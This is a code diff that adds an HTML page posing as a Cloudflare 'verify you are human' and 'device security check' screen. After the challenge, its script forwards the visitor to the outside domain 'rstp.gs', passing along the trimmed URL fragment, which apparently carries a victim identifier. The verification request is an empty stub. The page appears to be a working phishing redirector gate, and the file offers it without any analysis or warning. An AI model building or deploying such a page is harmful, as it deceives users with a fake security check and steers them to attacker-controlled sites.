@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title></title>
+  <meta content="no-cache, no-store, must-revalidate" http-equiv="Cache-Control"/>
+  <meta content="no-cache" http-equiv="Pragma"/>
+  <meta content="0" http-equiv="Expires"/>
+  <meta charset="utf-8"/>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
+  </head>
+  <body>
+  <div class="container mt-5">
+   <div class="row justify-content-center">
+    <div class="col-lg-5 text-center">
+     <span class="fs-5">
+      Check the box below to verify you are human....
+	  </span>
+     <div class="mt-2">
+    <form id="example-container" style="width: 300px; margin: auto">
+      <div
+        class="cf-turnstile"
+        data-sitekey="0x4AAAAAAAazedMz3sFotsP_"
+        data-theme="light"
+        data-appearance="interaction-only"
+      ></div>
+    </form>
+	</div>
+     <div class="mt-2 text-muted" style="font-size: 14px;">
+      Running device security check....
+     </div>
+    </div>
+   </div>
+  </div>
+    <script>
+      var redirectUrl = "rstp.gs";
+      var length = 0;
+      var ignoreStrNum = 5;
+      var currentHash = window.location.hash;
+      var newHash = "";
+      //var url = "example.com";
+      const all_characters = "abcdefghijklmnopqrstuvwxyz";
+
+      const generateRandomString = (length) => {
+        let result_string = "";
+        const characters_length = all_characters.length;
+        for (let i = 0; i < length; i++) {
+          result_string += all_characters.charAt(
+            Math.floor(Math.random() * characters_length)
+          );
+        }
+
+        return result_string;
+      };
+
+      if (currentHash) {
+        newHash = currentHash.slice(ignoreStrNum + 0);
+      }
+
+      let subdomain = generateRandomString(length);
+      var newURL = `${subdomain}${redirectUrl}#${newHash}`;
+
+      turnstile.ready(function () {
+        turnstile.render("#example-container", {
+          sitekey: "0x4AAAAAAAazedMz3sFotsP_",
+          callback: function (token) {
+           $.ajax({
+            //  url: "",
+            // type: "POST",
+             // contentType: "application/json",
+              data: JSON.stringify({
+                //response: token,
+              }),
+              success: function (data) {
+                console.log("Verification successful", data);
+                location.assign("https://"+ newURL + "");
+              },
+              error: function (jqXHR, textStatus, errorThrown) {
+                console.error("Error during verification:", errorThrown);
+                alert("Token verification failed");
+              },
+            });
+          },
+        });
+      });
+    </script>
+  </body>
+</html>
